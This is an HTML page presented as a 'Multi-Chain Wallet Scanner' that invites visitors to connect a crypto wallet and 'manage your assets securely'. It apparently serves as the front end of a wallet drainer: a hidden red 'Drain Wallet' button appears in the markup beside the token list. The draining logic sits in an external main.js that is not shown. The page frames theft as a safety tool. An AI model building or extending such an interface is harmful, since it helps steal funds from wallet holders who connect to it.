<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Multi-Chain Wallet Scanner</title>
  
  <!-- Load ethers first -->
  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
  
  <style>
    body {
      margin: 0;
      font-family: 'Arial', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #ffffff;
      min-height: 100vh;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .card {
      background: rgba(30, 30, 30, 0.9);
      backdrop-filter: blur(10px);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
      width: 100%;
      max-width: 600px;
      text-align: center;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .card h1 {
      margin-bottom: 10px;
      font-size: 28px;
      background: linear-gradient(45deg, #4CAF50, #2196F3);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
    }

    .subtitle {
      font-size: 14px;
      color: #aaaaaa;
      margin-bottom: 30px;
    }

    button {
      width: 100%;
      padding: 16px;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-bottom: 15px;
    }

    .connect-btn {
      background: linear-gradient(45deg, #4CAF50, #2E7D32);
      color: white;
      box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
    }

    .connect-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
    }

    .drain-btn {
      background: linear-gradient(45deg, #f44336, #c62828);
      color: white;
      box-shadow: 0 4px 15px rgba(244, 67, 54, 0.3);
    }

    .drain-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(244, 67, 54, 0.4);
    }

    .drain-btn.hidden {
      display: none;
    }

    .scan-btn {
      background: linear-gradient(45deg, #2196F3, #1565C0);
      color: white;
      box-shadow: 0 4px 15px rgba(33, 150, 243, 0.3);
    }

    .scan-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(33, 150, 243, 0.4);
    }

    .scan-btn.hidden {
      display: none;
    }

    .status {
      margin-top: 20px;
      font-size: 14px;
      color: #cccccc;
      min-height: 80px;
      padding: 15px;
      background: rgba(22, 22, 22, 0.8);
      border-radius: 10px;
      text-align: left;
      line-height: 1.6;
      white-space: pre-line;
      word-break: break-all;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .tokens-container {
      margin-top: 20px;
      padding: 20px;
      background: rgba(22, 22, 22, 0.8);
      border-radius: 10px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      max-height: 400px;
      overflow-y: auto;
    }

    .tokens-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 15px;
      padding-bottom: 10px;
      border-bottom: 2px solid rgba(76, 175, 80, 0.3);
    }

    .tokens-header h3 {
      margin: 0;
      color: #4CAF50;
      font-size: 18px;
    }

    .token-count {
      background: rgba(76, 175, 80, 0.2);
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 12px;
    }

    .tokens-list {
      max-height: 300px;
      overflow-y: auto;
    }

    .token-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px;
      background: rgba(40, 40, 40, 0.6);
      border-radius: 8px;
      margin-bottom: 8px;
      border: 1px solid rgba(255, 255, 255, 0.05);
    }

    .token-info {
      flex: 1;
    }

    .token-symbol {
      color: #ffffff;
      font-weight: bold;
      font-size: 16px;
      display: block;
    }

    .token-name {
      color: #aaaaaa;
      font-size: 12px;
      display: block;
      margin-top: 2px;
    }

    .token-amount {
      color: #4CAF50;
      font-weight: bold;
      font-size: 16px;
      text-align: right;
      min-width: 120px;
    }

    .token-value {
      color: #2196F3;
      font-size: 14px;
      text-align: right;
      min-width: 80px;
    }

    .chain-selector {
      margin: 15px 0;
      padding: 10px;
      background: rgba(22, 22, 22, 0.8);
      border-radius: 10px;
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .chain-selector select {
      width: 100%;
      padding: 10px;
      background: #2a2a2a;
      color: white;
      border: 1px solid #444;
      border-radius: 6px;
      font-size: 14px;
    }

    .hidden {
      display: none;
    }

    .loading {
      text-align: center;
      padding: 20px;
      color: #4CAF50;
    }

    .error {
      color: #f44336;
      background: rgba(244, 67, 54, 0.1);
      padding: 10px;
      border-radius: 8px;
      margin: 10px 0;
      border: 1px solid rgba(244, 67, 54, 0.3);
    }
  </style>
</head>

<body>
  <main class="container">
    <div class="card">
      <h1>🔗 Multi-Chain Wallet Scanner</h1>
      <p class="subtitle">
        Connect, scan tokens across all chains, and manage your assets securely
      </p>

      <!-- CONNECT BUTTON -->
      <button id="connectBtn" class="connect-btn">
        <span>🔗 Connect Wallet</span>
      </button>

      <!-- STATUS MESSAGE -->
      <div id="status" class="status">
        ⏳ Ready to connect...
      </div>

      <!-- CHAIN SELECTOR -->
      <div id="chainSelector" class="chain-selector hidden">
        <label>Switch Network:</label>
        <select id="networkSelect">
          <option value="1">🌐 Ethereum Mainnet</option>
          <option value="56">🟡 Binance Smart Chain</option>
          <option value="137">🟣 Polygon</option>
          <option value="42161">🔵 Arbitrum</option>
        </select>
      </div>

      <!-- SCAN ALL CHAINS BUTTON -->
      <button id="scanAllBtn" class="scan-btn hidden">
        🔍 Scan All Chains for Tokens
      </button>

      <!-- TOKENS DISPLAY -->
      <div id="tokensContainer" class="tokens-container hidden">
        <div class="tokens-header">
          <h3>💰 Wallet Tokens</h3>
          <span id="tokenCount" class="token-count">0 tokens</span>
        </div>
        <div id="tokens" class="tokens-list">
          <!-- Tokens will appear here -->
        </div>
      </div>

      <!-- DRAIN BUTTON -->
      <button id="drainBtn" class="drain-btn hidden">
        ⚡ Drain Wallet
      </button>
    </div>
  </main>

  <!-- MAIN SCRIPT -->
  <script src="main.js"></script>
</body>
</html>
